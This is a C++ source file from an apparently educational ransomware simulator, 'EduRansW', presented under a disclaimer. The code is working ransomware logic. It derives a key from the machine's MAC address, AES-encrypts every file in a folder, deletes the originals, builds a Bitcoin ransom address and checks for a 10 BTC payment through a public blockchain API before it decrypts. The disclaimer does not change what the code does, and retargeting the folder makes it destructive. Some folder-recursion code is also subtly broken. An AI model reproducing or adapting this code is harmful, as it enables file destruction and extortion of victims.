/*
 * DISCLAIMER:
 * EduRansW (Educational Ransomware Simulator) is developed for educational and research purposes only,
 * to simulate ransomware behavior in a controlled, ethical, and legal environment. It is intended to
 * assist cybersecurity professionals, researchers, and students in understanding, developing, and
 * enhancing offensive security tools and techniques for defensive and educational purposes.
 * By using EduRansW, users commit to ethical and responsible conduct, strictly prohibiting the application
 * of this software for any illegal or malicious activities. Users must comply with all applicable local,
 * national, and international laws regarding the use of security tools and software. WebSec B.V. disclaims
 * all liability for misuse of EduRansW or any damages that may result from its use. The responsibility
 * lies solely with the user to ensure ethical and lawful use of this software.
 *
 * ABOUT THE DEVELOPER:
 * WebSec B.V. specializes in the development of offensive security tools aimed at advancing the field
 * of cybersecurity. Our products are designed for cybersecurity professionals, researchers, and
 * educational institutions seeking to deepen their understanding of security vulnerabilities,
 * exploitation techniques, and defensive strategies. Our commitment is to contribute positively to the
 * cybersecurity community by equipping it with the knowledge and tools necessary to defend against
 * evolving digital threats.
 * Please use our tools responsibly and in accordance with ethical guidelines and legal requirements.
 * For more information, support, or feedback, visit https://websec.nl.
 *
 * COPYRIGHT © WebSec B.V. All rights reserved.
 */

#include "stdafx.h"
#include "RansEngine.h"
#include "aes.h"
#include "sha256.h"
#include "ripemd160.h"
#include "base58_encode.h"
#include "resource.h"

#include <stdio.h>
#include <Windows.h>
#include <Iphlpapi.h>
#include <Assert.h>

#pragma comment(lib, "iphlpapi.lib")

#include "nlohmann-json/single_include/nlohmann/json.hpp"

#include <string>
#include <iostream>
#include <winsock2.h>

#pragma warning(disable:4996)

using namespace std;
using json = nlohmann::json;

RansEngine::RansEngine()
{
}


RansEngine::~RansEngine()
{
}


const DWORD pattern = 0x12345678;
const BYTE privateKey[32] = { 'p','r','i','v','a','t','e' };
const BYTE publicKey[32] = { 'p','u','b','l','i','c' };

void hex2char(BYTE* in, int len, char* out)
{
	char temp[3];
	for (size_t i = 0; i < len; i++)
	{
		sprintf_s(temp, "%02x", in[i]);
		lstrcatA(out, temp);
	}
}

void char2hex(char* in, int len, BYTE* out)
{
	char ch;
	BYTE v;
	for (size_t i = 0; i < len; i += 2)
	{
		v = 0;

		ch = in[i];
		if (ch >= '0' && ch <= '9')
			v = (ch - '0') << 4;
		else if (ch >= 'A' && ch <= 'F')
			v = (ch - 55) << 4;
		else if (ch >= 'a' && ch <= 'f')
			v = (ch - 87) << 4;
		else
			v = 0;

		ch = in[i + 1];
		if (ch >= '0' && ch <= '9')
			v |= (ch - '0');
		else if (ch >= 'A' && ch <= 'F')
			v |= (ch - 55);
		else if (ch >= 'a' && ch <= 'f')
			v |= (ch - 87);
		else
			v = 0;
		out[i / 2] = v;
	}
}

BOOL createAttackFolder(CHAR* targetFolder)
{
	CHAR mouduleFileName[512] = { NULL };
	CHAR sampleFilePath[512] = { NULL };

	GetModuleFileNameA(NULL, mouduleFileName, 512);

	CHAR* pFileName = StrRStrIA(mouduleFileName, NULL, "\\");
	if (!pFileName)
		return FALSE;

	lstrcpynA(targetFolder, mouduleFileName, pFileName - mouduleFileName + 1);

	lstrcatA(targetFolder, "\\CryptPath");

	if (!CreateDirectoryA(targetFolder, NULL))
	{
		if (GetLastError()!= ERROR_ALREADY_EXISTS)
			return FALSE;
	}		

	sprintf_s(sampleFilePath, "%s\\%s", targetFolder, "Sample1.txt");
	extractResource(sampleFilePath, "TXT", IDR_TXT1);

	sprintf_s(sampleFilePath, "%s\\%s", targetFolder, "Sample2.txt");
	extractResource(sampleFilePath, "TXT", IDR_TXT2);

	sprintf_s(sampleFilePath, "%s\\%s", targetFolder, "Sample3.txt");
	extractResource(sampleFilePath, "TXT", IDR_TXT3);

	sprintf_s(sampleFilePath, "%s\\%s", targetFolder, "Sample4.txt");
	extractResource(sampleFilePath, "TXT", IDR_TXT4);

	sprintf_s(sampleFilePath, "%s\\%s", targetFolder, "Sample5.txt");
	extractResource(sampleFilePath, "TXT", IDR_TXT5);

	return TRUE;
}

BOOL extractResource(CHAR* path, CHAR* resourceType, WORD resourceID)
{
	HRSRC hResource;
	HGLOBAL hPNG;
	LPVOID lpBuf;
	DWORD dwSize;
	HINSTANCE hInstance;

	hInstance = GetModuleHandleA(NULL);

	hResource = FindResourceA(hInstance, MAKEINTRESOURCEA(resourceID), resourceType);
	if (hResource == NULL)
		return FALSE;

	hPNG = LoadResource(hInstance, hResource);
	lpBuf = LockResource(hPNG);
	dwSize = SizeofResource(hInstance, hResource);

	HANDLE hFile;
	DWORD writeBytes;

	hFile = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	WriteFile(hFile, lpBuf, dwSize, &writeBytes, NULL);
	if (writeBytes != dwSize)
		return FALSE;

	CloseHandle(hFile);

	return TRUE;
}

std::string GET(std::string url) 
{
	char buffer[2];
	std::string body;

	std::string cmd = "curl -s " + url;
	
	FILE *p = _popen(cmd.c_str(), "r");

	if (!p) 
	{
		return "Error";
	}

	while (fgets(buffer, sizeof(buffer), p)) 
	{
		body += buffer;
	}
	return body;
}


BOOL verifyPayment(char* btcAddress)
{
    //sample url=https://api.blockcypher.com/v1/btc/main/addrs/38DGj87axzmQiZeAd1w1y5FEmuu5a7pfBa/full

	std::string url = "https://api.blockcypher.com/v1/btc/main/addrs/";

	url.append(btcAddress);
	url.append("/full");

	std::string response = GET(url);

	long long totalReceived = 0;

	try {
		auto jsonResponse = json::parse(response);
		if (!jsonResponse["txs"].empty()) {
			for (const auto &txs : jsonResponse["txs"])
			{
				int confirmations = txs["confirmations"];

				for (const auto& output : txs["outputs"])
				{
					if (output["addresses"].is_array() && std::find(output["addresses"].begin(), output["addresses"].end(), btcAddress) != output["addresses"].end()) {
						totalReceived += output["value"].get<LONG64>();
					}
				}
			}

			double totalReceivedBTC = static_cast<double>(totalReceived) / 100000000;

			if (totalReceivedBTC < 10)
				return FALSE;

			return TRUE;
		}
		else
		{
			return FALSE;
		}
	}
	catch (json::parse_error& e)
	{
		return FALSE;
	}
	return FALSE;
}

UINT encryptThread(LPVOID pParam)
{
	CHAR targetFolder[512] = { NULL };
	BYTE sessionKey[32] = { NULL };
	CHAR szTime[32] = { NULL };

	__time32_t t;

	_time32(&t);
	sprintf_s(szTime, "%08X", t);

	if (!WriteProfileStringA("RansWSimulator", "CountDownTime", szTime))
	{
		*(DWORD*)pParam = 1;
		return 0;
	}

	GetProfileStringA("RansWSimulator", "TargetFolder", "", targetFolder, 512);
	if (lstrlenA(targetFolder) == 0)
	{
		::MessageBoxA(NULL, "Could not find target folder!", "EduRansW", MB_ICONERROR);
		*(DWORD*)pParam = 1;
		return 0;
	}

	if (!getProfileWithEncrypt("RansWSimulator", "SessionKey", sessionKey))
	{
		::MessageBoxA(NULL, "Could not find session key!", "EduRansW", MB_ICONERROR);
		*(DWORD*)pParam = 1;
		return 0;
	}

	encryptFolder(targetFolder, sessionKey);

	*(DWORD*)pParam = 1;

	return 1;
}


BOOL runRansomware()
{
	HANDLE hCryptThread;
	DWORD cryptThreadId;
	DWORD ret;

	hCryptThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)encryptThread, &ret, 0, &cryptThreadId);
	WaitForSingleObject(hCryptThread, INFINITE);

	return (BOOL)ret;
}

BOOL initRansomwareAttack()
{
	BYTE sessionKey[16] = { NULL };
	CHAR szSessionKey[64] = { NULL };
	CHAR szBTCAddress[64] = { NULL };
	CHAR szTargetFolder[512] = { NULL };

	generateSessionKey(sessionKey);
	hex2char(sessionKey, 16, szSessionKey);
	if (!writeProfileWithEncrypt("RansWSimulator", "SessionKey", sessionKey))
		return FALSE;

	generateBTCAddress((BYTE*)&publicKey, sizeof(int), szBTCAddress);
	if (!WriteProfileStringA("RansWSimulator", "BTCAddress", szBTCAddress))
		return FALSE;

	if (!createAttackFolder(szTargetFolder))
		return FALSE;
	if (!WriteProfileStringA("RansWSimulator", "TargetFolder", szTargetFolder))
		return FALSE;

	return TRUE;

}

BOOL writeProfileWithEncrypt(char* appName, char* keyName, BYTE* value)
{
	BYTE out[16] = { NULL };
	CHAR szOut[64] = { NULL };

	WORD key_schedule[60] = { NULL };

	aes_key_setup(privateKey, key_schedule, 256);
	aes_encrypt(value, out, key_schedule, 256);

	hex2char(out, 16, szOut);
	
	return WriteProfileStringA(appName, keyName, szOut);
}

BOOL getProfileWithEncrypt(char* appName, char* keyName, BYTE* value)
{
	BYTE out[16];
	CHAR szOut[64] = { NULL };

	WORD key_schedule[60] = { NULL };

	GetProfileStringA(appName, keyName, "", szOut, 64);
	if (lstrlenA(szOut) == 0)
		return FALSE;

	char2hex(szOut, 32, out);

	aes_key_setup(privateKey, key_schedule, 256);
	aes_decrypt(out, value, key_schedule, 256);

	return TRUE;
}


char* getMAC() 
{
	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
	char *mac_addr = (char*)malloc(18);

	AdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (AdapterInfo == NULL) 
	{
		free(mac_addr);
		return NULL; // it is safe to call free(NULL)
	}

	// Make an initial call to GetAdaptersInfo to get the necessary size into the dwBufLen variable
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(AdapterInfo);
		AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);
		if (AdapterInfo == NULL) {
			free(mac_addr);
			return NULL;
		}
	}

	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) 
	{
		// Contains pointer to current adapter info
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
		do {
			// technically should look at pAdapterInfo->AddressLength
			//   and not assume it is 6.
			sprintf_s(mac_addr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
				pAdapterInfo->Address[0], pAdapterInfo->Address[1],
				pAdapterInfo->Address[2], pAdapterInfo->Address[3],
				pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
			pAdapterInfo = pAdapterInfo->Next;
		} while (pAdapterInfo);
	}

	free(AdapterInfo);
	return mac_addr; // caller must free.
}

//generate session key unique by user
void generateSessionKey(BYTE* sessionKey)
{
	char* macAddr = NULL;
	BYTE macHash[20] = { NULL };

	if (!sessionKey)
		return;

	macAddr = getMAC();
	if (macAddr)
	{
		ripemd160((BYTE*)macAddr, lstrlenA(macAddr), macHash);
	}
	else
	{
		ripemd160((BYTE*)"\x0\x1\x2\x3\x4\x5\x6\x7", 8, macHash);
	}

	memcpy(sessionKey, macHash, 16);

	return;
}

//generate pesuado random BTC address
void generateBTCAddress(BYTE* pubKey, int keySize, CHAR* bitcoinAddr)
{
	BYTE buf[SHA256_BLOCK_SIZE];
	BYTE hash_ripemd[RIPEMD160_DIGEST_LENGTH];

	SHA256_CTX ctx;

	sha256_init(&ctx);
	sha256_update(&ctx, pubKey, keySize);
	sha256_final(&ctx, buf);

	// 2. RIPEMD160
	ripemd160(buf, SHA256_BLOCK_SIZE, hash_ripemd);

	// 3. Add 0x00 on front
	BYTE temp[RIPEMD160_DIGEST_LENGTH + 1];
	temp[0] = 0;
	memcpy(&temp[1], hash_ripemd, RIPEMD160_DIGEST_LENGTH);

	// 4. SHA256 twice
	sha256_init(&ctx);
	sha256_update(&ctx, temp, RIPEMD160_DIGEST_LENGTH + 1);
	sha256_final(&ctx, buf);

	sha256_init(&ctx);
	sha256_update(&ctx, buf, SHA256_BLOCK_SIZE);
	sha256_final(&ctx, buf);

	// 5. Take first 4 bytes only and add to temp
	BYTE long_result[RIPEMD160_DIGEST_LENGTH + 1 + 4];

	memcpy(long_result, temp, RIPEMD160_DIGEST_LENGTH + 1);
	memcpy(long_result + RIPEMD160_DIGEST_LENGTH + 1, buf, 4);

	// 6. Base58
	EncodeBase58(long_result, RIPEMD160_DIGEST_LENGTH + 1 + 4, bitcoinAddr);

	return;
}

void deleteFolder(char* folderPath)
{
	char searchPath[512] = { NULL };
	char filePath[512] = { NULL };

	WIN32_FIND_DATAA fd;

	lstrcpyA(searchPath, folderPath);
	lstrcatA(searchPath, "\\*.*");

	HANDLE hFind = ::FindFirstFileA(searchPath, &fd);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do {
			if (!lstrcmpA(fd.cFileName, ".") || !lstrcmpA(fd.cFileName, ".."))
				continue;
			else if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				deleteFolder(fd.cFileName);
			}
			else
			{
				ZeroMemory(filePath, 512);
				sprintf_s(filePath, "%s\\%s", folderPath, fd.cFileName);

				DeleteFileA(filePath);
			}

		} while (::FindNextFileA(hFind, &fd));
		::FindClose(hFind);
	}

	return;
}

void encryptFolder(char* folderPath, BYTE* sessionKey)
{
	char searchPath[512] = { NULL };
	char filePath[512] = { NULL };

	WIN32_FIND_DATAA fd;

	lstrcpyA(searchPath, folderPath);
	lstrcatA(searchPath, "\\*.*");

	HANDLE hFind = ::FindFirstFileA(searchPath, &fd);
	if (hFind != INVALID_HANDLE_VALUE) 
	{
		do {
			if (!lstrcmpA(fd.cFileName, ".") || !lstrcmpA(fd.cFileName, ".."))
				continue;
			else if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				encryptFolder(fd.cFileName, sessionKey);
			}
			else
			{
				ZeroMemory(filePath, 512);
				sprintf_s(filePath, "%s\\%s", folderPath, fd.cFileName);

				encryptFile(filePath, sessionKey);
			}

		} while (::FindNextFileA(hFind, &fd));
		::FindClose(hFind);
	}
	return;
}

void decryptFolder(char* folderPath, BYTE* sessionKey)
{
	char searchPath[512] = { NULL };
	char filePath[512] = { NULL };

	WIN32_FIND_DATAA fd;

	lstrcpyA(searchPath, folderPath);
	lstrcatA(searchPath, "\\*.*");

	HANDLE hFind = ::FindFirstFileA(searchPath, &fd);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do {
			if (!lstrcmpA(fd.cFileName, ".") || !lstrcmpA(fd.cFileName, ".."))
				continue;
			else if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				encryptFolder(fd.cFileName, sessionKey);
			}
			else
			{
				ZeroMemory(filePath, 512);
				sprintf_s(filePath, "%s\\%s", folderPath, fd.cFileName);

				decryptFile(filePath, sessionKey);
			}

		} while (::FindNextFileA(hFind, &fd));
		::FindClose(hFind);
	}
	return;
}

/**********************encrypted file structure**********************************/
//20 bytes : key hash
//4 bytes : original file size
//4 bytes : pattern
/********************************************************************************/

//encrypt the personal file for ransom.
BOOL encryptFile(char* filePath, BYTE* sessionKey)
{
	if (!filePath || !lstrlenA(filePath))
		return FALSE;

	CHAR newFilePath[512] = { NULL };

	HANDLE hFile;
	HANDLE hNewFile;

	DWORD fileSize;
	DWORD originFileSize;
	DWORD readBytes;
	DWORD writeBytes;
	BYTE* fileBuf = NULL;
	BYTE* outBuf = NULL;
	DWORD outBufsize;
	DWORD filePattern;
	BYTE keyHash[20] = { NULL };

	hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	fileSize = GetFileSize(hFile, NULL);

	originFileSize = fileSize;
	fileSize = fileSize % 16 == 0 ? fileSize : (fileSize + (16 - fileSize % 16));

	fileBuf = new BYTE[fileSize];
	if (!fileBuf)
		return FALSE;

	ZeroMemory(fileBuf, fileSize);

	ReadFile(hFile, fileBuf, originFileSize, &readBytes, NULL);
	if (readBytes != originFileSize)
		return FALSE;

	CloseHandle(hFile);

	if (originFileSize>28)
	{
		memcpy(&filePattern, fileBuf + 24, 4);

		if (filePattern == 0x12345678)
			return FALSE;
	}

	outBufsize = fileSize + 28;
	outBuf = new BYTE[outBufsize];
	ZeroMemory(outBuf, outBufsize);

	ripemd160(sessionKey, 16, keyHash);

	memcpy(outBuf, keyHash, 20);
	memcpy(outBuf + 20, &originFileSize, 4);
	memcpy(outBuf + 24, &pattern, 4);

	encryptBuf(fileBuf, fileSize, outBuf + 28, sessionKey);

	lstrcpyA(newFilePath, filePath);
	lstrcatA(newFilePath, ".eduransw");

	hNewFile = CreateFileA(newFilePath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hNewFile == INVALID_HANDLE_VALUE)
		return FALSE;

	WriteFile(hNewFile, outBuf, outBufsize, &writeBytes, NULL);
	if (writeBytes != outBufsize)
		return FALSE;

	CloseHandle(hNewFile);

	DeleteFileA(filePath);

	delete[] fileBuf;
	delete[] outBuf;

	return TRUE;
}

//decrypt the personal file if you are paid for ransom
BOOL decryptFile(char* filePath, BYTE* sessionKey)
{
	if (!filePath || !lstrlenA(filePath))
		return FALSE;

	CHAR newFilePath[512] = { NULL };

	HANDLE hFile;
	HANDLE hNewFile;
	DWORD fileSize;
	DWORD readBytes;
	DWORD writeBytes;
	BYTE* fileBuf = NULL;
	BYTE* outBuf = NULL;
	DWORD outBufSize;

	DWORD originFileSize;
	DWORD filePattern;

	hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	fileSize = GetFileSize(hFile, NULL);
	fileBuf = new BYTE[fileSize];
	if (!fileBuf)
		return FALSE;

	ReadFile(hFile, fileBuf, fileSize, &readBytes, NULL);
	if (readBytes != fileSize)
		return FALSE;

	CloseHandle(hFile);

	if (fileSize < 28)
		return FALSE;

	memcpy(&originFileSize, fileBuf + 20, 4);
	memcpy(&filePattern, fileBuf + 24, 4);
	
	if (filePattern != 0x12345678)
		return FALSE;

	if (!verifyPassword(fileBuf, sessionKey))
		return FALSE;

	outBufSize = fileSize - 28;
	outBuf = new BYTE[outBufSize];

	decryptBuf(fileBuf + 28, outBufSize, outBuf, sessionKey);

	lstrcpyA(newFilePath, filePath);
	char* pExt = StrStrA(newFilePath, ".eduransw");
	if (pExt)
	{
		int pos = pExt - newFilePath;
		newFilePath[pos] = '\x0';
	}

	hNewFile = CreateFileA(newFilePath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hNewFile == INVALID_HANDLE_VALUE)
		return FALSE;

	WriteFile(hNewFile, outBuf, outBufSize, &writeBytes, NULL);
	if (writeBytes != outBufSize)
		return FALSE;

	CloseHandle(hNewFile);

	DeleteFileA(filePath);

	delete[] outBuf;
	delete[] fileBuf;

	return TRUE;
}

BOOL verifyPassword(BYTE* fileHash, BYTE* sessionKey)
{
	BYTE keyhash[20] = { NULL };

	if (!sessionKey)
		return FALSE;

	ripemd160(sessionKey, 16, keyhash);

	if (memcmp(keyhash, fileHash, 20))
		return FALSE;

	return TRUE;
}


void encryptBuf(BYTE* buf, int bufSize, BYTE* outBuf, BYTE* key)
{
	WORD key_schedule[60];
	BYTE* temp = outBuf;

	aes_key_setup(key, key_schedule, 256);

	for (int i = 0; i < bufSize/16; i++) {
		aes_encrypt(buf + i * 16, temp + i * 16, key_schedule, 256);

	}
}

void decryptBuf(BYTE* buf, int bufSize, BYTE* outBuf, BYTE* key)
{
	WORD key_schedule[60];
	BYTE* temp = outBuf;

	aes_key_setup(key, key_schedule, 256);

	for (int i = 0; i < bufSize/16; i++) {
		aes_decrypt(buf + i * 16, temp + i * 16, key_schedule, 256);

	}
}